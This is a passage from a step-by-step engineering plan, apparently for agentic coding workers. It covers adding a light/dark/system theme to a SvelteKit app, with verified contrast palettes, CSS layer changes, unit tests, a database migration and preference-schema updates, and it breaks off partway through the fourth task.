# Appearance 1c — Theme Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Ship a light / dark / system theme option, delivered as an SSR-rendered `<style>` block scoped to the `(app)` group, with a pure-CSS `prefers-color-scheme` fallback for everything outside it.

**Architecture:** The palette exists as two artefacts that cannot import each other — a layered `@layer theme` arm in `src/app.css` (serves `system` and every logged-out route) and a TypeScript token table in `src/lib/appearance/theme-css.ts` (serves the explicit `light`/`dark` choices via `<svelte:head>`). Neither generates the other; a drift test asserts they are identical, which is how `theme-tokens.test.ts` already guards the dark palette. The block is emitted at `:root:root` specificity so it beats the unlayered `prefers-contrast` overrides regardless of head order.

**Tech Stack:** SvelteKit 2 / Svelte 5.55.4 runes, Tailwind CSS v4.2.2, Drizzle + Neon Postgres, zod 4.3.6, vitest (jsdom + PGlite), Playwright.

**Spec:** [`docs/superpowers/specs/2026-09-06-appearance-customization-design.md`](../specs/2026-09-06-appearance-customization-design.md) — read §"Decisions" 2–5, §"1c — Theme" and §"Testing" before starting. **Where the Decisions section and the 1c section disagree, the 1c section wins** — the Decisions section was not re-flowed when 1c was revised (it still names `--color-accent-text`, which shipped as `--color-accent-ink`, and still says the contrast block overrides "four tokens", which is five since 1a added `--color-border-strong`).

## Global Constraints

- **Migration number is `0018`.** `drizzle/0017_free_black_panther.sql` is the current head and `drizzle/meta/_journal.json` ends at `"idx": 17`.
- **Production applies schema with `drizzle-kit push`, not `migrate`** (`scripts/vercel-build.mjs`, gated on `MIGRATE_ON_BUILD=true`). A hand-written backfill in the `.sql` body **never executes in production**. The column `DEFAULT` is therefore the only mechanism that reaches prod rows, and the column must be `NOT NULL`.
- **`theme` defaults to `'dark'`.** Decided for this plan: it preserves today's behaviour byte-for-byte for every existing account, and light becomes strictly opt-in. Do not "improve" this to `'system'` — that would silently repaint the app for every user on a light OS.
- **The theme control is a native `<select>`.** It joins the existing generic loop at `settings/appearance/+page.svelte:424`. Do not build a segmented radio group; the spec defers the Appearance page rebuild to a later phase.
- **`@layer theme` is the LOWEST layer.** Tailwind emits `@layer theme, base, components, utilities;`. Anything in `@layer base` outranks it. Verified against the installed 4.2.2.
- **`@theme { }` cannot contain an `@media` rule** — it is a variable-declaration block only. The light arm must be a plain `:root { }` inside `@layer theme { @media … }`.
- **Never write the literal characters `</style>` in a `.svelte` file** — it breaks `npm run check` ("`<script>` was left open"). Build the tag in a `.ts` module with the closing tag split: `"</" + "style>"`.
- **`{@html}` applies zero escaping and CSP does not cover CSS injection.** Every value interpolated into the style block is either from a frozen table or re-validated against `/^#[0-9a-f]{6}$/i` **at the interpolation site**. Do not reuse `HEX_RE` from `contrast.ts` for this — it also accepts 3-digit hex.
- **`data-density` and `data-reduced-motion` STAY on the `(app)` wrapper div.** The spec (§1c) and `registry.ts:34-36` both say 1c moves them onto the theme `<style>` block. **That is impossible and both are corrected in Task 9.** `Heatmap.svelte:123` compiles to `[data-reduced-motion="true"] .heatmap-cell.svelte-irk33f` — a content-derived scope hash an external stylesheet can never target. The replacement invariant: _the theme block emits only colour tokens and `color-scheme`; the density and motion rules set only spacing and animation timing. The two sets are disjoint, so the wrapper being a descendant does not matter._
- Run the full suite with `npx vitest run`; a single file with `npx vitest run tests/unit/<file>.test.ts`. `@electric-sql/pglite` **is** installed in this worktree, so `tests/unit/pg/` runs and `npm run check` is at its 0-error baseline.
- `npm run build` needs a `DATABASE_URL`; use the CI placeholder: `DATABASE_URL='postgresql://placeholder:placeholder@placeholder/placeholder?sslmode=require'`.

---

## The verified light palette

Every value below was computed against the real WCAG maths and checked on the surfaces it actually renders on. **Do not substitute values by eye.** The three tokens the spec flags as un-mirrorable are marked.

| Token                     | Light value                 | Note                                                                    |
| ------------------------- | --------------------------- | ----------------------------------------------------------------------- |
| `--color-surface`         | `#eef0f6`                   |                                                                         |
| `--color-surface-raised`  | `#ffffff`                   |                                                                         |
| `--color-surface-overlay` | `#e2e5ee`                   | inverts direction — recessed, so darker                                 |
| `--color-glass`           | `rgba(255, 255, 255, 0.72)` | **still a lightener**: page → card                                      |
| `--color-glass-hover`     | `rgba(255, 255, 255, 0.4)`  | **NOT** flipped — lower white alpha than `glass`; see Task 3            |
| `--color-glass-border`    | `rgba(0, 0, 0, 0.14)`       | **FLIPPED** to dark-alpha                                               |
| `--color-border-strong`   | `rgba(0, 0, 0, 0.46)`       | **FLIPPED**; 3.32:1, floor is 3:1 (0.44 gives 3.13, 0.42 fails at 2.93) |
| `--color-text-primary`    | `#14141c`                   | worst 14.54:1                                                           |
| `--color-text-secondary`  | `#4c4c63`                   | worst 6.61:1                                                            |
| `--color-text-muted`      | `#5c5c72`                   | worst 5.16:1                                                            |
| `--color-accent`          | `#4f46e5`                   |                                                                         |
| `--color-accent-hover`    | `#4338ca`                   |                                                                         |
| `--color-accent-fg`       | `#ffffff`                   | 6.29:1 — light fills take **white**, dark fills take `#111111`          |
| `--color-accent-ink`      | `#4f46e5`                   | 4.99:1; the logged-out fallback only                                    |
| `--color-success`         | `#036b4e`                   | 5.18:1 as text, 6.53:1 with white on it                                 |
| `--color-success-fg`      | `#ffffff`                   |                                                                         |
| `--color-warning`         | `#7f5300`                   | 5.31:1 as text, 6.69:1 with white on it                                 |
| `--color-warning-fg`      | `#ffffff`                   |                                                                         |
| `--color-danger`          | `#b41f17`                   | 5.30:1 as text, 6.67:1 with white on it                                 |
| `--color-danger-fg`       | `#ffffff`                   |                                                                         |
| `--color-danger-ink`      | `#b41f17`                   | on light the fill is already legible as text                            |
| `--color-info`            | `#3a44c4`                   | 5.95:1                                                                  |
| `--color-scrim`           | `rgba(0, 0, 0, 0.6)`        | unchanged across schemes                                                |
| `--color-heatmap-0`       | `#e4e7ee`                   | steps: 1.42 / 1.44 / 1.55 / 1.80, floor 1.35                            |
| `--color-heatmap-1`       | `#8fd0c1`                   |                                                                         |
| `--color-heatmap-2`       | `#4fb3a0`                   |                                                                         |
| `--color-heatmap-3`       | `#22907c`                   |                                                                         |
| `--color-heatmap-4`       | `#0c6455`                   |                                                                         |

Light `prefers-contrast: more` arm — each must **beat** the light base it shadows:

| Token                    | Light HC value        | Ratio vs base |
| ------------------------ | --------------------- | ------------- |
| `--color-text-muted`     | `#43435a`             | 7.62 vs 5.16  |
| `--color-text-secondary` | `#3a3a4d`             | 8.81 vs 6.61  |
| `--color-glass-border`   | `rgba(0, 0, 0, 0.26)` | 1.86 vs 1.37  |
| `--color-border-strong`  | `rgba(0, 0, 0, 0.66)` | 6.61 vs 3.32  |
| `--color-accent`         | `#3730a3`             | 9.93 vs 6.29  |

**Light `INK_BACKDROP` is `#e2e5ee`** — the _darkest_ light surface. The operator inverts: dark-on-light contrast is worst against the darkest backdrop, exactly mirroring the dark scheme's "lightest surface" rule.

Ink derived per accent preset on light (darkening toward `READABLE_DARK` = `#111111`, solved against `#e2e5ee`), all ≥4.5:1: `#4f46e5`→`#4f46e5`, `#7c3aed`→`#7c3aed`, `#ec4899`→`#af3973`, `#ef4444`→`#b83737`, `#f59e0b`→`#8c5d0e`, `#10b981`→`#107453`, `#06b6d4`→`#0b7182`, `#3b82f6`→`#3065ba`, `#f97316`→`#a34f14`, `#64748b`→`#59677b`.

---

## File Structure

**Created**

- `src/lib/appearance/theme-css.ts` — the scheme token tables (`LIGHT_TOKENS`, `DARK_TOKENS`, the two high-contrast arms) and `buildThemeStyle()`, which returns the whole `<style>` element as a string. No zod; imported by a `.svelte` file, so it is bound by `appearance-bundle-boundary.test.ts`.
- `drizzle/0018_*.sql` — adds `user_preferences.theme`.
- `tests/unit/theme-css.test.ts` — `buildThemeStyle` output shape, the injection guard, and the **drift test** that pins the TS tables against `src/app.css`.
- `tests/e2e/theme.test.ts` — the SSR-vs-CSR regression the `:root:root` decision exists for.

**Modified**

- `src/lib/utils/contrast.ts` — `compositeOver` gains a hex guard; `readableInk` gains a per-scheme backdrop and overlay.
- `src/app.css` — `color-scheme` moves out of `@layer base`; the light arm and both `prefers-contrast` arms land inside `@layer theme`.
- `src/lib/server/db/schema.ts:~220` — the `theme` column.
- `src/lib/appearance/registry.ts` — the `theme` entry, plus the corrected `DomBinding` comment.
- `src/lib/appearance/schema.ts` — `theme` in all three arity objects.
- `src/routes/(app)/+layout.svelte` — emits the block; **drops** `style:--color-accent-ink`.
- `src/routes/(app)/settings/appearance/+page.svelte:64-70` — `theme` in the `$state` literal.
- `tests/unit/theme-tokens.test.ts` — parameterised by scheme; `whiteAlpha` generalised.
- `tests/unit/appearance-page-ssr.test.ts` — three hardcoded counts move by +1.
- `tests/e2e/accessibility.test.ts`, `scripts/seed-e2e.ts`, `playwright.config.ts` — the light-mode scan.
- Docs per Task 9.

---

### Task 1: Contrast primitives become scheme-aware

`readableInk` can only lighten toward white against a hardcoded dark backdrop, so it cannot serve a light page. `compositeOver` has no input guard, which lets a mis-parsed token _pass_ an assertion — the silent-pass path has to close in the same commit that first feeds it light values.

**Files:**

- Modify: `src/lib/utils/contrast.ts:50-104`
- Test: `tests/unit/contrast.test.ts`

**Interfaces:**

- Produces: `INK_BACKDROP_LIGHT = "#e2e5ee"`; `readableInk(colour: string, opts?: { backdrop?: string; overlay?: string; target?: number }): string`; `compositeOver` unchanged in signature but now throws `Error` on a non-hex `base` or `overlay`.
- Consumes: nothing new.

- [ ] **Step 1: Write the failing tests**

Append to `tests/unit/contrast.test.ts`:

```ts
describe("compositeOver rejects non-hex input", () => {
  // Without this guard compositeOver("garbage") returns "#23c1NaN",
  // relativeLuminance rejects it and returns 0, and contrastRatio then
  // reports ~21:1 — so a mis-parsed light token makes an assertion PASS.
  it("throws on a malformed base", () => {
    expect(() => compositeOver(0.1, "garbage")).toThrow(/not a hex colour/i);
  });

  it("throws on a malformed overlay", () => {
    expect(() => compositeOver(0.1, "#ffffff", "nope")).toThrow(/not a hex colour/i);
  });
});

describe("readableInk darkens for a light scheme", () => {
  it("solves against the darkest light surface by darkening toward black", () => {
    const ink = readableInk("#f59e0b", {
      backdrop: INK_BACKDROP_LIGHT,
      overlay: READABLE_DARK,
    });
    expect(ink).toBe("#8c5d0e");
    expect(contrastRatio(ink, INK_BACKDROP_LIGHT)).toBeGreaterThanOrEqual(4.5);
  });

  it("leaves an accent that is already legible on light untouched", () => {
    expect(readableInk("#4f46e5", { backdrop: INK_BACKDROP_LIGHT, overlay: READABLE_DARK })).toBe(
      "#4f46e5",
    );
  });

  it("still lightens for the dark scheme by default", () => {
    const ink = readableInk("#4f46e5");
    expect(contrastRatio(ink, INK_BACKDROP)).toBeGreaterThanOrEqual(4.5);
  });
});
```

- [ ] **Step 2: Run them and watch them fail**

Run: `npx vitest run tests/unit/contrast.test.ts`
Expected: FAIL — `INK_BACKDROP_LIGHT` is not exported, and `compositeOver` does not throw.

- [ ] **Step 3: Implement**

In `src/lib/utils/contrast.ts`, replace `compositeOver` and `readableInk`:

```ts
/**
 * Flatten an alpha overlay onto an opaque base, as the browser would.
 *
 * Throws rather than degrading: an unguarded bad input returns a string like
 * "#23c1NaN", which `relativeLuminance` scores as 0 and `contrastRatio` then
 * reports as ~21:1 — a silent PASS in exactly the tests that exist to catch
 * an unreadable palette.
 */
export function compositeOver(
  alpha: number,
  base: string,
  overlay: string = READABLE_LIGHT,
): string {
  if (!HEX_RE.test(base)) throw new Error(`compositeOver: base is not a hex colour: "${base}"`);
  if (!HEX_RE.test(overlay)) {
    throw new Error(`compositeOver: overlay is not a hex colour: "${overlay}"`);
  }
  const top = toRgb(overlay);
  return (
    "#" +
    toRgb(base)
      .map((v, i) =>
        Math.round(top[i] * alpha + v * (1 - alpha))
          .toString(16)
          .padStart(2, "0"),
      )
      .join("")
  );
}

/**
 * The DARKEST of the six opaque surfaces the light scheme renders on
 * (`--color-surface-overlay`).
 *
 * The operator inverts against the dark scheme's rule and for the same
 * reason: dark-on-light contrast is worst against the darkest backdrop, so
 * an ink that clears the threshold here clears it on all six.
 */
export const INK_BACKDROP_LIGHT = "#e2e5ee";

/**
 * Shift `colour` toward `overlay` until it is legible as text on `backdrop`.
 *
 * Dark scheme: lighten toward white against the lightest surface.
 * Light scheme: darken toward black against the darkest surface.
 * Monotonic in both directions, so the first candidate that clears `target`
 * is also the closest one to the user's chosen colour.
 */
export function readableInk(
  colour: string,
  {
    backdrop = INK_BACKDROP,
    overlay = READABLE_LIGHT,
    target = 4.5,
  }: { backdrop?: string; overlay?: string; target?: number } = {},
): string {
  if (!HEX_RE.test(colour)) {
    if (import.meta.env.DEV) {
      console.warn(`[contrast] Invalid hex colour: "${colour}". Falling back to ${overlay}.`);
    }
    return overlay;
  }
  for (let step = 0; step <= 100; step++) {
    const candidate = compositeOver(step / 100, colour, overlay);
    if (contrastRatio(candidate, backdrop) >= target) return candidate;
  }
  return overlay;
}
```

- [ ] **Step 4: Update the one existing caller**

`readableInk`'s second parameter changed from a positional `backdrop` to an options object. Only `tests/unit/theme-tokens.test.ts:160` and `src/routes/(app)/+layout.svelte:23` call it, and both use the default. Confirm with `rg 'readableInk\(' src tests` — if any call passes a second positional argument, convert it to `{ backdrop: … }`.

- [ ] **Step 5: Run the full suite**

Run: `npx vitest run`
Expected: PASS. Nothing else consumes these two functions with non-default arguments.

- [ ] **Step 6: Prove the guard has teeth**

Temporarily delete the `HEX_RE.test(base)` line and re-run `npx vitest run tests/unit/contrast.test.ts`. Expected: "throws on a malformed base" FAILS. Restore the line.

- [ ] **Step 7: Commit**

```bash
git add src/lib/utils/contrast.ts tests/unit/contrast.test.ts
git commit -m "feat(contrast): make readableInk scheme-aware and guard compositeOver"
```

---

### Task 2: `theme-tokens.test.ts` becomes scheme-parameterised

The test closes over a module-level `const T` and calls `whiteAlpha`, which **throws** on any value that is not literally `rgba(255,255,255,A)`. Both take the whole file out the moment a light arm exists. This task restructures it with **no new assertions** — it must stay green against today's dark-only stylesheet, so that Task 3's red is caused by the palette and not by the refactor.

**Files:**

- Modify: `tests/unit/theme-tokens.test.ts:19-99, 264-273, 295-303`

**Interfaces:**

- Produces: `blockBody(css, opener, label)`, `alphaOf(value): { alpha: number; overlay: string }`, `surfaces(T)` taking its token table as a parameter.

- [ ] **Step 1: Replace the parser helpers**

Replace lines 19-57 with:

```ts
/**
 * The body of the first block whose header matches `opener`, brace-balanced.
 *
 * A regex cannot do this once the light arm nests a `prefers-contrast` block
 * inside a `prefers-color-scheme` block — the lazy `[\s\S]*?` stops at the
 * first inner `}`.
 */
function blockBody(css: string, opener: RegExp, label: string): string {
  const m = opener.exec(css);
  if (!m) throw new Error(`Could not find ${label} in src/app.css`);
  const start = css.indexOf("{", m.index + m[0].length - 1);
  let depth = 0;
  for (let i = start; i < css.length; i++) {
    if (css[i] === "{") depth++;
    else if (css[i] === "}" && --depth === 0) return css.slice(start + 1, i);
  }
  throw new Error(`Unbalanced braces in ${label}`);
}

function parseDeclarations(body: string): Record<string, string> {
  const tokens: Record<string, string> = {};
  for (const line of body.split("\n")) {
    const m = line.match(/^\s*(--[\w-]+):\s*(.+?);\s*$/);
    if (m) tokens[m[1]] = m[2].trim();
  }
  return tokens;
}

function readAppCss(): string {
  return readFileSync(fileURLToPath(new URL("../../src/app.css", import.meta.url)), "utf8");
}

const CSS = readAppCss();

const DARK = parseDeclarations(blockBody(CSS, /@theme\s*\{/, "the @theme block"));

const HC_DARK = parseDeclarations(
  blockBody(
    blockBody(CSS, /@media \(prefers-contrast: more\)\s*\{/, "the dark contrast block"),
    /:root\s*\{/,
    "the dark contrast :root",
  ),
);
```

**Define ONLY the dark-side constants in this task.** The light arm does not exist in
`src/app.css` until Task 3, and `blockBody` throws when its opener does not match — so
declaring `LIGHT_ARM` / `LIGHT` / `HC_LIGHT` here would throw at module load and take the
whole file down with it, destroying this task's "still green, pure refactor" property.
Task 3 adds them.

Widen the `$lib/utils/contrast` import to include `READABLE_LIGHT`, which the scheme table
in Step 3 needs.

```ts
/**
 * `rgba(R,G,B,A)` -> the alpha and the colour it composites toward.
 *
 * Was `whiteAlpha`, which threw on anything but white — correct while the
 * app was dark-only, and fatal the moment the light arm flips glass-hover,
 * glass-border and border-strong to black-alpha. It still throws on a value
 * that is neither pure white nor pure black, so a token that stops being a
 * simple overlay fails loudly rather than being silently skipped.
 */
function alphaOf(value: string): { alpha: number; overlay: string } {
  const m = value.match(/^rgba\((\d+),\s*(\d+),\s*(\d+),\s*([\d.]+)\)$/);
  if (!m) throw new Error(`Expected an rgba() token, got: ${value}`);
  const [r, g, b] = [m[1], m[2], m[3]];
  if (r === "255" && g === "255" && b === "255") return { alpha: Number(m[4]), overlay: "#ffffff" };
  if (r === "0" && g === "0" && b === "0") return { alpha: Number(m[4]), overlay: "#000000" };
  throw new Error(`Expected a white- or black-alpha token, got: ${value}`);
}
```

- [ ] **Step 2: Parameterise `surfaces()`**

Replace the `const T = readThemeTokens();` line and `surfaces()` with:

```ts
/** Every opaque surface a foreground token is actually rendered on. */
function surfaces(T: Record<string, string>): Record<string, string> {
  const raised = T["--color-surface-raised"];
  const glass = alphaOf(T["--color-glass"]);
  const hover = alphaOf(T["--color-glass-hover"]);
  return {
    surface: T["--color-surface"],
    "surface-raised": raised,
    "surface-overlay": T["--color-surface-overlay"],
    "glass-on-surface": compositeOver(glass.alpha, T["--color-surface"], glass.overlay),
    "glass-on-raised": compositeOver(glass.alpha, raised, glass.overlay),
    "glass-hover": compositeOver(hover.alpha, raised, hover.overlay),
  };
}
```

- [ ] **Step 3: Wrap every `describe` in a scheme loop**

Introduce the scheme table immediately after the helpers, and make each existing `describe` a function of it. The dark entries reproduce today's behaviour exactly:

```ts
const SCHEMES = [
  {
    name: "dark",
    T: DARK,
    HC: HC_DARK,
    inkBackdrop: INK_BACKDROP,
    inkOverlay: READABLE_LIGHT,
    /** Dark solves the ink against the LIGHTEST surface; light, the darkest. */
    pickInkBackdrop: (a: string, b: string) =>
      contrastRatio(b, "#ffffff") < contrastRatio(a, "#ffffff") ? b : a,
  },
] as const;
```

Then convert each `describe("…")` to `describe.each(SCHEMES)("$name — …", ({ T, HC, … }) => { … })`, replacing every bare `T` with the destructured one and every `surfaces()` with `surfaces(T)`. In the ink describe, replace `readableInk(preset)` with `readableInk(preset, { backdrop: inkBackdrop, overlay: inkOverlay })` and the hardcoded `INK_BACKDROP` assertion with:

```ts
it("solves the ink against the surface the scheme's worst case lands on", () => {
  const chosen = Object.values(surfaces(T)).reduce(pickInkBackdrop);
  expect(inkBackdrop).toBe(chosen);
});
```

In the control-boundary and `prefers-contrast` describes, replace both `whiteAlpha(x)` calls with `alphaOf(x)` and pass `.overlay` through to `compositeOver`.

- [ ] **Step 4: Run — must be green, with the same test count as before**

Run: `npx vitest run tests/unit/theme-tokens.test.ts`
Expected: PASS. `SCHEMES` has one entry, so this is a pure refactor. If the count changed, the refactor dropped or duplicated a case — fix before continuing.

- [ ] **Step 5: Prove the parser still bites**

Temporarily change `--color-text-muted` in `src/app.css`'s `@theme` to `#71718a` (its pre-1a value). Run the file. Expected: FAIL on `--color-text-muted on glass-hover`. Revert.

- [ ] **Step 6: Commit**

```bash
git add tests/unit/theme-tokens.test.ts
git commit -m "test(theme): parameterise the token assertions by scheme"
```

---

### Task 3: The light palette lands in `app.css`

**Files:**

- Modify: `src/app.css:68-94` (move `color-scheme`), `:186-211` (the contrast block moves into the layer), plus the new light arm
- Modify: `tests/unit/theme-tokens.test.ts` (add the light entry to `SCHEMES`)

**Interfaces:**

- Produces: a `@layer theme` block carrying `color-scheme` for both schemes, the light token arm, and both `prefers-contrast` arms.

- [ ] **Step 1: Add the light scheme to the test first**

First add the light-side constants Task 2 deliberately left out — they throw until the
light arm exists, which is what makes Step 2's failure the right one. Place them beside
`DARK` / `HC_DARK`, and **repoint `HC_DARK` at `CSS_DARK_ONLY`** so it cannot start
matching the light contrast block if the two are ever reordered:

```ts
/** The light arm's body — everything inside `@media (prefers-color-scheme: light)`. */
const LIGHT_ARM = blockBody(CSS, /@media \(prefers-color-scheme: light\)\s*\{/, "the light arm");

/** The stylesheet with the light arm removed, so `HC_DARK` cannot match the light one. */
const CSS_DARK_ONLY = CSS.replace(LIGHT_ARM, "");

/**
 * The light palette as the BROWSER resolves it: the light arm overrides
 * @theme, it does not replace it. Asserting the arm alone would silently
 * exempt every token it does not redeclare.
 */
const LIGHT = {
  ...DARK,
  ...parseDeclarations(blockBody(LIGHT_ARM, /:root\s*\{/, "the light :root")),
};

const HC_LIGHT = parseDeclarations(
  blockBody(
    blockBody(LIGHT_ARM, /@media \(prefers-contrast: more\)\s*\{/, "the light contrast block"),
    /:root\s*\{/,
    "the light contrast :root",
  ),
);
```

Widen the `$lib/utils/contrast` import to add `INK_BACKDROP_LIGHT` and `READABLE_DARK`.

Then add to `SCHEMES`:

```ts
  {
    name: "light",
    T: LIGHT,
    HC: HC_LIGHT,
    inkBackdrop: INK_BACKDROP_LIGHT,
    inkOverlay: READABLE_DARK,
    /** Light solves the ink against the DARKEST surface — the operator inverts. */
    pickInkBackdrop: (a: string, b: string) =>
      contrastRatio(b, "#000000") < contrastRatio(a, "#000000") ? b : a,
  },
```

The tinted-chip describe also needs its light expectations; its `CHIPS` table is scheme-independent (it names tokens, not values), so it needs no edit once `T` is destructured — but `--color-danger-ink` and `--color-info` must resolve in `LIGHT`, which they will once Step 2 lands.

- [ ] **Step 2: Run and watch it fail**

Run: `npx vitest run tests/unit/theme-tokens.test.ts`
Expected: FAIL at collection — `Could not find the light arm in src/app.css`.

- [ ] **Step 3: Restructure `app.css`**

Delete `color-scheme: dark;` and its comment from `@layer base { :root { … } }` (lines 69-76), leaving the `body` and `button` rules in place. Then insert this immediately after the closing `}` of the `@theme` block:

```css
/*
 * The scheme fallback for everyone the SSR theme block does not reach:
 * anonymous visitors on `/` and `/auth/*`, `src/routes/+error.svelte`, and
 * any (app) page whose stored theme is `system`.
 *
 * LAYERED, and layered in `theme` specifically. Tailwind emits
 * `@layer theme, base, components, utilities;` so `theme` is the LOWEST
 * layer — which is exactly what lets the unlayered `:root:root` SSR block
 * beat this unconditionally (spec decision 3). Within one layer, source
 * order decides, so the light arm wins over the dark arm above it whenever
 * its media query matches.
 *
 * `color-scheme` lives HERE and not in `@layer base` for that same reason.
 * It sat in `@layer base` until 1c, and `base` outranks `theme` — so a
 * layered light arm could not have overridden it, and every light-mode user
 * would have kept dark native checkboxes, radios, scrollbars and the
 * date-picker glyph. Most visibly on /settings/appearance itself, whose
 * <select>s carry no `appearance: none`.
 *
 * The `prefers-contrast` arms live here too (spec decision 5). They used to
 * be unlayered, which made them beat any layered theme rule — on a light
 * page the dark high-contrast values measure 1.29:1, worse than the 2.53:1
 * the spec already calls unacceptable.
 */
@layer theme {
  :root {
    /* Makes native checkboxes, radios, scrollbars and the date-picker glyph
       render dark. There are 14 native checkbox/radio inputs in the app with
       no appearance:none and no accent-color, so without this they paint as
       bright white widgets on a near-black page. This does NOT restyle a
       closed <select> — that needs appearance:none plus a drawn chevron. The
       light arm below sets the mirror value for the same reason. */
    color-scheme: dark;
  }

  @media (prefers-contrast: more) {
    :root {
      --color-text-muted: #ababba;
      --color-text-secondary: #d4d4e0;
      --color-glass-border: rgba(255, 255, 255, 0.24);
      --color-border-strong: rgba(255, 255, 255, 0.5);
      --color-accent: #3730a3;
    }
  }

  @media (prefers-color-scheme: light) {
    :root {
      color-scheme: light;

      /* Three tokens cannot be mirrored and are flipped, not re-valued.
         glass stays a LIGHTENER (page -> card); glass-border and
         border-strong flip to dark-alpha. glass-hover does NOT flip — see
         its own comment below. */
      --color-glass: rgba(255, 255, 255, 0.72);
      --color-glass-border: rgba(0, 0, 0, 0.14);
      /* Hover reads DARKER than the card by carrying LESS white, not by
         flipping to black-alpha. `bg-glass` and `hover:bg-glass-hover` are
         two backgrounds on the SAME element over the same page — they do
         not stack — so both composite over --color-surface, and the darker
         of the two is simply the lower alpha. Flipping to black made a
         hovered card #e3e5eb against a #eef0f6 page (darker than the
         background it sits on) and dropped the hovered refill chips to
         4.15:1. */
      --color-glass-hover: rgba(255, 255, 255, 0.4);
      /* 3.32:1 on the worst surface; 0.42 measures 2.93 and fails 1.4.11. */
      --color-border-strong: rgba(0, 0, 0, 0.46);
      --color-surface: #eef0f6;
      --color-surface-raised: #ffffff;
      /* Inverts direction: four of its five uses are recessed tracks and
         chips, which must go DARKER on a light page, not lighter. */
      --color-surface-overlay: #e2e5ee;
      --color-text-primary: #14141c;
      --color-text-secondary: #4c4c63;
      --color-text-muted: #5c5c72;
      --color-accent: #4f46e5;
      --color-accent-hover: #4338ca;
      /* Light fills take a WHITE foreground where dark fills take #111111. */
      --color-accent-fg: #ffffff;
      --color-accent-ink: #4f46e5;
      --color-success: #036b4e;
      --color-success-fg: #ffffff;
      --color-warning: #7f5300;
      --color-warning-fg: #ffffff;
      --color-danger: #b41f17;
      --color-danger-fg: #ffffff;
      /* On light the fill is already 5.30:1 as text, so ink == fill. */
      --color-danger-ink: #b41f17;
      --color-info: #3a44c4;
      --color-heatmap-0: #e4e7ee;
      --color-heatmap-1: #8fd0c1;
      --color-heatmap-2: #4fb3a0;
      --color-heatmap-3: #22907c;
      --color-heatmap-4: #0c6455;
    }

    @media (prefers-contrast: more) {
      :root {
        --color-text-muted: #43435a;
        --color-text-secondary: #3a3a4d;
        --color-glass-border: rgba(0, 0, 0, 0.26);
        --color-border-strong: rgba(0, 0, 0, 0.66);
        --color-accent: #3730a3;
      }
    }
  }
}
```

Then delete the old unlayered `@media (prefers-contrast: more)` block at the end of the file (lines 186-211 including its comment) — it has moved into the layer above.

- [ ] **Step 4: Run the token test**

Run: `npx vitest run tests/unit/theme-tokens.test.ts`
Expected: PASS, roughly double the previous case count.

- [ ] **Step 5: Prove the light half bites**

Change `--color-text-muted` in the light arm to `#9a9aac` (the dark value). Re-run. Expected: FAIL — `light — --color-text-muted on surface-raised` at ~2.44:1. Revert.

- [ ] **Step 6: Verify the layer claim in a real build**

```bash
DATABASE_URL='postgresql://placeholder:placeholder@placeholder/placeholder?sslmode=require' npm run build
```

Then confirm both `color-scheme` declarations survive in one layer and the light one is last:

```bash
rg -o 'color-scheme:\s*\w+' .svelte-kit/output/client/_app/immutable/assets/*.css
```

Expected: `color-scheme: dark` then `color-scheme: light`.

- [ ] **Step 7: Commit**

```bash
git add src/app.css tests/unit/theme-tokens.test.ts
git commit -m "feat(theme): author the light palette and move the scheme arms into @layer theme"
```

---

### Task 4: The `theme` preference — column, registry, arities, page state

**These four changes cannot be split.** `src/lib/preferences/schema.ts` derives its key set by subtraction (`Exclude<PreferenceKey, AppearanceKey>`), so a column with no registry entry is TS1360 there; and `appearanceFieldSchemas`'s `satisfies` clause makes a registry entry with no arity entry TS1360 three times over. Splitting does not degrade, it fails to compile.

**Files:**

- Modify: `src/lib/server/db/schema.ts` (the `userPreferences` table)
- Create: `drizzle/0018_*.sql`
- Modify: `src/lib/appearance/registry.ts:87-155`
- Modify: `src/lib/appearance/schema.ts:96-127`
- Modify: `src/routes/(app)/settings/appearance/+page.svelte:64-70`
- Modify: `tests/unit/appearance-page-ssr.test.ts:93, 103, 131`

**Interfaces:**

- Produces: `AppearanceKey` gains `"theme"`; `AppearanceValues["theme"] = "light" | "dark" | "system"`; the form action `?/theme`; `UserPreferences["theme"]: string`.
- Consumes: the registry/arity machinery from 1b, unchanged.

- [ ] **Step 1: Add the column**

In `src/lib/server/db/schema.ts`, immediately after the `accentColor` column:

```ts
  // Defaults to 'dark', not 'system'. The app was dark by construction
  // before 1c, so every existing row belongs to someone who never chose
  // anything — defaulting to 'system' would repaint the app for every user
  // on a light OS, which is a visible change delivered as a feature.
  // Production applies schema with `drizzle-kit push` (scripts/vercel-build.mjs),
  // so no backfill in the migration body ever runs in prod: this DEFAULT is
  // the only mechanism that reaches existing rows, and NOT NULL is what
  // makes it apply to them.
  theme: text("theme").notNull().default("dark"),
```

- [ ] **Step 2: Generate the migration**

```bash
npx drizzle-kit generate
```

Confirm `drizzle/0018_*.sql` contains exactly one statement and that `drizzle/meta/_journal.json` gained `"idx": 18`:

```sql
ALTER TABLE "user_preferences" ADD COLUMN "theme" text DEFAULT 'dark' NOT NULL;
```

- [ ] **Step 3: Add the registry entry**

In `src/lib/appearance/registry.ts`, add to `APPEARANCE_ENTRIES` immediately after the `accentColor` entry:

```ts
  {
    key: "theme",
    group: "colour",
    label: "Theme",
    description:
      "System follows your device's light or dark setting. Auth pages and the landing page always follow your device.",
    control: "select",
    options: [
      { value: "dark", label: "Dark" },
      { value: "light", label: "Light" },
      { value: "system", label: "System" },
    ],
    dom: { kind: "none" },
  },
```

`dom: { kind: "none" }` is deliberate: the value does not reach the DOM as a custom property or a data attribute — it selects which _table_ of custom properties the theme block emits. The `DomBinding` union is not extended for one consumer.

- [ ] **Step 4: Add it to all three arities**

In `src/lib/appearance/schema.ts`, add one line to each of the three objects:

```ts
// appearanceFieldSchemas (arity 1)
  theme: z.strictObject({ theme: z.enum(optionValues("theme")) }),

// appearancePayloadShape (arity 2)
  theme: z.enum(optionValues("theme")).optional(),

// appearanceImportShape (arity 3)
  theme: z.enum(optionValues("theme")).optional(),
```

- [ ] **Step 5: Seed the page's local state**

In `src/routes/(app)/settings/appearance/+page.svelte`, add to the `values = $state({…})` literal:

```ts
    theme: data.preferences.theme,
```

No markup change: the `{#each APPEARANCE_ENTRIES.filter((e) => e.control === "select")}` loop at `:424` renders it, and `actionFor` derives `?/theme` and `fieldAction` is built from `APPEARANCE_ACTION_KEYS`.

- [ ] **Step 6: Update the three hardcoded SSR counts**

